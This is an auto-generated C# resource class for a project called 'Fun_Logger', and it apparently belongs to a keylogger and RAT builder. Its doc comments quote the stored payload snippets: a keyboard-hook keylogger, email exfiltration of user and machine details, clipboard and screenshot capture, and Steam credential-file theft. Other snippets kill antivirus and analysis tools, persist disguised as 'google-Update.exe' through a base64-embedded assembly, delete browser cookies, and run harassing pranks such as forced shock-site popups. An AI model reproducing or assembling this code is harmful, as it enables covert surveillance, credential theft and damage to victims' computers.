//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.18051
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Fun_Logger.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Fun_Logger.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Alert()
        ///    {
        ///        try
        ///        {
        ///            NetworkCredential creds = new NetworkCredential(Decrypt(&quot;[EMAIL]&quot;, &quot;[PASS]&quot;), Decrypt(&quot;[PASSWORD]&quot;, &quot;[PASS]&quot;));
        ///            MailMessage mail = new MailMessage();
        ///            mail.To.Add(Decrypt(&quot;[EMAIL]&quot;, &quot;[PASS]&quot;));
        ///            mail.From = new MailAddress(Decrypt(&quot;[EMAIL]&quot;, &quot;[PASS]&quot;));
        ///            mail.Subject = Environment.UserName + &quot;@&quot; + Environment.MachineName + &quot; Activated&quot;;
        ///            mail.Body = Environment.UserName + &quot; is logged  [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string alert {
            get {
                return ResourceManager.GetString("alert", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static void AntiRun()
        ///    {
        ///        try
        ///        {
        ///            List&lt;string&gt; L = new List&lt;string&gt;(new string[] { &quot;sample&quot;, &quot;outpost&quot;, &quot;npfmsg&quot;, &quot;bdagent&quot;, &quot;kavsvc&quot;, &quot;egui&quot;, &quot;zlclient&quot;, &quot;sbiesvc&quot;, &quot;keyscrambler&quot;, &quot;wireshark&quot;, &quot;mbam&quot;, &quot;ollydbg&quot; });
        ///            foreach (System.Diagnostics.Process pr in System.Diagnostics.Process.GetProcesses())
        ///            {
        ///                if (L.Contains(pr.ProcessName.ToLower()))
        ///                {
        ///                    pr.Kill();
        ///                }
        ///            } [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string antis {
            get {
                return ResourceManager.GetString("antis", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void CD()
        ///    {
        ///        MessageBox.Show(&quot;I&apos;m hungry&quot;);
        ///        System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
        ///        while (true)
        ///        {
        ///                foreach (System.IO.DriveInfo drive in drives)
        ///                {
        ///                    if (drive.DriveType == System.IO.DriveType.CDRom)
        ///                    {
        ///                        EjectMedia.Eject(@&quot;\\.\E:&quot;);
        ///                    }
        ///                }
        ///            
        ///        }
        ///    }
        ///
        ///    class EjectMedia
        ///    {
        ///       [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string cd {
            get {
                return ResourceManager.GetString("cd", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to contents = contents + &quot;\n\n[CLIPBOARD]: &quot; + Clipboard.GetText();.
        /// </summary>
        internal static string clipboardc {
            get {
                return ResourceManager.GetString("clipboardc", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Cookies()
        ///    {
        ///        try
        ///        {
        ///            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\Google\\Chrome\\User Data\\Default\\Cookies&quot;);
        ///            string[] Cookies = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
        ///            foreach (string file in Cookies)
        ///            {
        ///                File.Delete(file);
        ///            }
        ///            File.Delete(Environment.SpecialFolder.ApplicationData + @&quot;\Mozilla\Fi [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string cookies {
            get {
                return ResourceManager.GetString("cookies", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Flash()
        ///    {
        ///        Form form = new Form();
        ///        form.FormBorderStyle = FormBorderStyle.None;
        ///        form.ShowInTaskbar = false;
        ///        PictureBox pic = new PictureBox();
        ///        form.Size = new Size(640, 480);
        ///        form.StartPosition = FormStartPosition.CenterScreen;
        ///        form.Controls.Add(pic);
        ///        pic.Dock = DockStyle.Fill;
        ///        pic.SizeMode = PictureBoxSizeMode.StretchImage;
        ///        pic.Image = getFlashimgURL(&quot;http://25.media.tumblr.com/75120c9da3c7b904df34a194 [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string flash {
            get {
                return ResourceManager.GetString("flash", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void IEDefault()
        ///    {
        ///        while (true)
        ///        {
        ///            try
        ///            {
        ///                RegistryKey regkey = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\shell\\Associations\\UrlAssociations\\http\\UserChoice&quot;, true);
        ///                string browser = regkey.GetValue(&quot;Progid&quot;).ToString();
        ///
        ///                if (browser != &quot;IE.HTTP&quot;)
        ///                {
        ///                    regkey.SetValue(&quot;Progid&quot;, &quot;IE.HTTP&quot;);
        ///                }
        ///
        ///                foreach (Process p [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string ie {
            get {
                return ResourceManager.GetString("ie", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Meatspin()
        ///    {
        ///        Process.Start(&quot;http://www.meatspin.com&quot;);
        ///        Application.DoEvents();
        ///        Thread.Sleep(5000);
        ///        while (true)
        ///        {
        ///            Process.Start(&quot;http://www.meatspin.com&quot;);
        ///            Thread.Sleep(100);
        ///        }
        ///    }.
        /// </summary>
        internal static string meatspin {
            get {
                return ResourceManager.GetString("meatspin", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Melt()
        ///        {
        ///            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        ///            if (!Application.ExecutablePath.Contains(path))
        ///            {
        ///                if (File.Exists(path + &quot;\\google-Update.exe&quot;)) { File.Delete(path + &quot;\\google-Update.exe&quot;); }
        ///                if (File.Exists(path + &quot;\\location.txt&quot;)) { File.Delete(path + &quot;\\location.txt&quot;); }
        ///                File.Copy(Application.ExecutablePath, path + &quot;\\google-Update.exe&quot;);
        ///      [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string melt {
            get {
                return ResourceManager.GetString("melt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Message()
        ///    {
        ///        MessageBox.Show(&quot;MSG&quot;);
        ///    }.
        /// </summary>
        internal static string message {
            get {
                return ResourceManager.GetString("message", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void Penis()
        ///    {
        ///        try
        ///        {
        ///            Random r = new Random();
        ///            int num = r.Next(1, 30);
        ///            switch (num)
        ///            {
        ///                case 1:
        ///                    Clipboard.SetText(&quot;8=============D&quot;);
        ///                    break;
        ///                case 2:
        ///                    Clipboard.SetImage(getimgURL(&quot;http://www.pegym.com/wp-content/uploads/2013/05/HappyPenis1.jpg&quot;));
        ///                    break;
        ///                case 3:
        ///                    Clipboard.SetI [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string penis {
            get {
                return ResourceManager.GetString("penis", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Diagnostics;
        ///using System.Windows.Forms;
        ///using System.Runtime.InteropServices;
        ///using System.IO;
        ///using System.Text;
        ///using System.Threading;
        ///using System.Net;
        ///using System.Net.Mail;
        ///using System.Reflection;
        ///using System.Drawing;
        ///using System.Drawing.Imaging;
        ///using System.Collections.Generic;
        ///using System.Security.Cryptography;
        ///using Microsoft.Win32;
        ///using System.Media;
        ///using System.Resources;
        ///
        ///class WindowsLocalHostProcess
        ///{
        ///    private const int WH_KEYBOARD_LL = [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string sauce {
            get {
                return ResourceManager.GetString("sauce", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to MemoryStream ms = new MemoryStream();
        ///GetScreenShot().Save(ms, ImageFormat.Png);
        ///ms.Position = 0;
        ///Attachment a = new Attachment(ms, &quot;screenshot.png&quot;);.
        /// </summary>
        internal static string screenshot {
            get {
                return ResourceManager.GetString("screenshot", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static void AddToStartup()
        ///    {
        ///        Assembly asm = Assembly.Load(Convert.FromBase64String(&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAGlb0VEAAAAAAAAAAOAAAiELAQsAAAoAAAAGAAAAAAAAzigAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAHQoAABXAAAAAEAAANgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAA8JwAAHAAAAAA [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string startup {
            get {
                return ResourceManager.GetString("startup", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static string ProgramFilesx86()
        ///    {
        ///        if (8 == IntPtr.Size
        ///            || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable(&quot;PROCESSOR_ARCHITEW6432&quot;))))
        ///        {
        ///            return Environment.GetEnvironmentVariable(&quot;ProgramFiles(x86)&quot;);
        ///        }
        ///
        ///        return Environment.GetEnvironmentVariable(&quot;ProgramFiles&quot;);
        ///    }
        ///
        ///
        ///    static void Steam()
        ///    {
        ///        Attachment steamscreen = null;
        ///        Attachment ssfn = null;
        ///        Attachment config = null;
        ///        string ssfn [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string steam {
            get {
                return ResourceManager.GetString("steam", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void WallPaper()
        ///    {
        ///        while (true)
        ///        {
        ///            try
        ///            {
        ///                Wallpaper.Set(new Uri(&quot;[WALLPAPER URL]&quot;), Wallpaper.Style.Stretched);
        ///            }
        ///            catch { }
        ///            Thread.Sleep(2000);
        ///        }
        ///    }
        ///
        ///    public sealed class Wallpaper
        ///    {
        ///        Wallpaper() { }
        ///
        ///        const int SPI_SETDESKWALLPAPER = 20;
        ///        const int SPIF_UPDATEINIFILE = 0x01;
        ///        const int SPIF_SENDWININICHANGE = 0x02;
        ///
        ///        [DllImport(&quot;user3 [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string wallpaper {
            get {
                return ResourceManager.GetString("wallpaper", resourceCulture);
            }
        }
    }
}
